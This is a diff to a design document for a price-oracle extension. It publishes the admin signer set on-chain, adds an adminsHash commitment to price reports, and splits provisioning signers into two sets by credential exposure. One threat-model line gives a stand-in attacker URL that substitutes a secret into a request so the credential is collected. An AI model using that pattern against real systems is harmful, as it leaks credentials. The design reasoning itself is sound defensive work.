@@ -322,6 +322,7 @@ struct PriceReport {
     uint64  observedAt;
     bytes32 instructionId;
     bytes32 endpointsHash;  // keccak256 of the active SET_ENDPOINTS payload
+    bytes32 adminsHash;     // keccak256 of the active SET_ADMINS payload
 }
 
 body = abi.encode(report)
@@ -345,6 +346,22 @@ guarantee, no replay protection beyond what a payload arranges for itself.
   never what a machine is actually *running*, and with several machines a missed
   `setEndpoints` call leaves one publishing perfectly valid prices from the wrong
   configuration.
+- **adminsHash** commits to the admin signer set in force when the price was
+  computed, on exactly the same terms and for the same reason. A price is only as
+  trustworthy as the party that could install the credentials behind it, so a
+  machine running a superseded admin set cannot submit either — the rotated-out
+  signers might still be the ones it honours.
+
+`adminsHash` was appended to the body **without** bumping `domain` to
+`USDX_ORACLE_PRICE_V2`, which the rule above otherwise requires. That is a
+deliberate development-phase exception, taken because the extension and
+`UsdxPriceStore` are redeployed together and no mixed pair is ever live. The
+body-length check on both sides is what enforces it: a peer still on the
+six-word layout fails the length check outright rather than having its body read
+as one that merely omits the admin commitment. Solidity's `abi.decode` tolerates
+trailing bytes, so without that explicit check a longer body would be silently
+truncated to the fields the older store knows about. Bump the domain the moment
+the two can ship independently.
 
 ### No target binding, by decision
 
@@ -428,16 +445,84 @@ provisioning envelope.
 
 ## 9. Provisioning (`internal/provision`, `internal/runtimecfg`)
 
-Two things the extension needs are deliberately not compiled into the image:
+Three things the extension needs are deliberately not compiled into the image:
 
 - **RPC endpoints**, which arrive by on-chain instruction so that *which
   providers we read* is publicly verifiable — that visibility is the point.
+- **The admin signer set**, which arrives the same way, for the same reason:
+  *who may provision this machine* should be as verifiable as which sources it
+  reads.
 - **Credentials**, which arrive by direct instruction: no gas, no permanent
   on-chain record of a ciphertext, instant rotation, and no secret-handling path
   in Solidity.
 
-What stays baked is the part that must not be substitutable: the admin signer set
-that authorises provisioning.
+### Why the admin set is published rather than baked
+
+An earlier design compiled the admin set into the image, on the reasoning that
+the root of trust must not be substitutable. That reasoning holds only if the
+substitution channel is weaker than the thing it replaces, and here it is not:
+`SET_ADMINS` is owner-only, and the owner key is a governance address that can
+already choose every price source (§15). Baking the set bought nothing the owner
+key did not already have, and cost a rebuild and re-attestation for every
+rotation.
+
+What the on-chain route adds is a public record. The payload is calldata,
+`expectedAdminsHash` records it per machine, and `UsdxPriceStore` refuses a price
+whose `adminsHash` is not the published one — so "who could have installed the
+credentials behind this price" is answerable from the chain alone, for any
+historical report. A baked set answered that question only for whoever compared
+code hashes.
+
+The bootstrap works because there is no default. A verifier starts with **no**
+admin sets and rejects every envelope until they are installed, so there is no
+guessable set and no first-come window to race for. They are memory-only like
+everything else here, which means a restart returns the machine to that state:
+`SET_ADMINS` must precede `SET_SECRET` every time. That ordering is the cost of
+the design, and it is the safe direction — a machine that has forgotten who its
+admins are refuses to be provisioned rather than trusting whoever asks first.
+
+### Two sets, because the two credential classes differ
+
+`SET_ADMINS` publishes **two** signer sets, and the envelope's `ref` decides
+which one authorises it:
+
+| set | governs | floor |
+|---|---|---|
+| `backing` | `config.HexAPIKeyRef` only | 1 signer |
+| `providers` | every other ref | 2 distinct signers |
+
+The split follows the exposure, which is genuinely asymmetric:
+
+- A **provider** credential is substituted into a URL that `SET_ENDPOINTS`
+  chooses. Since there is no host allowlist (§15), the owner key can already
+  publish `https://attacker.example/{secret}` and collect that credential on the
+  next observation. It is also the class an operator rotates routinely, and a
+  rogue value denies service on every chain naming it.
+- The **backing** credential cannot be routed anywhere: `validate` refuses to let
+  `hex_api_key` be named as a provider secret, and it is only ever an auth header
+  on a pinned URL. It is therefore the one credential the owner key cannot obtain
+  by other means — and, because the endpoint is pinned, a wrong value degrades
+  the feed to cash-less rather than moving the price.
+
+A single signer is accepted for `backing` on that impact argument: the blast
+radius of a wrong value is denial, not a forged reserve figure. It is worth being
+explicit that this is the *narrower* of the two protections applied to the
+*better-protected* credential — the reasoning is impact, not exposure, and if the
+backing endpoint ever stops being pinned the floor must go back up.
+
+Two properties make the split mean anything:
+
+- **The ref-to-set mapping is pinned in the build, never carried in the payload.**
+  If the published document could name its own refs, whoever held the 1-of-1
+  backing key could claim the provider credentials and the split would authorise
+  nothing.
+- **A signer from the other set does not count.** Each envelope is verified
+  against exactly one set, so the backing key cannot help satisfy a provider
+  threshold or the reverse. A ref this build has never heard of falls under the
+  *stronger* set, so a new credential name cannot be slipped in on one signature.
+
+The sets may overlap — the same person can hold both roles — since that changes
+nothing about which set authorises which envelope.
 
 ### The envelope
 
@@ -453,7 +538,8 @@ body = abi.encode(
 )
 ```
 
-signed by at least `Threshold` **distinct** admins from the baked set, using the
+signed by at least the published threshold of **distinct** admins from the set
+that governs `ref`, using the
 standard EIP-191 personal-sign convention so a hardware wallet can produce them.
 Distinctness is the whole point of M-of-N: without deduplication, one compromised
 key could supply the same signature M times and satisfy the threshold alone.
@@ -482,8 +568,24 @@ than assumed:
 - `SET_ENDPOINTS` is **instruction-only**. Its authorisation is the owner-only
   check in the on-chain sender, which a direct action would bypass entirely —
   anyone able to reach the proxy could repoint the data sources.
+- `SET_ADMINS` is **instruction-only**, on the same grounds and with more at
+  stake: a direct action would let anyone who can reach the proxy install their
+  own admin set and then provision the machine through it.
 - `SET_SECRET` is **direct-only**. A credential has no business on-chain, where
   the ciphertext would be permanent and public.
+
+`SET_ENDPOINTS` and `SET_ADMINS` are separate commands rather than two fields of
+one payload, so either can be rotated without republishing the other, and because
+they answer different questions: one decides which sources a price comes from,
+the other decides who may put credentials in the machine that reads them.
+
+`SET_ADMINS` carries its own monotonic `version`. The instruction channel has the
+registry's nonce, but the admin set is the root of trust for every credential
+that follows, so it does not lean on that alone: a captured `SET_ADMINS` must not
+be able to reinstate a rotated-out signer. Rotation deliberately does **not**
+reset the per-ref envelope versions — those are anti-rollback state independent
+of who signs, and clearing them would let an envelope the outgoing admins signed
+be replayed against the incoming set.
 
 ### The provider list is unconstrained, by decision
 
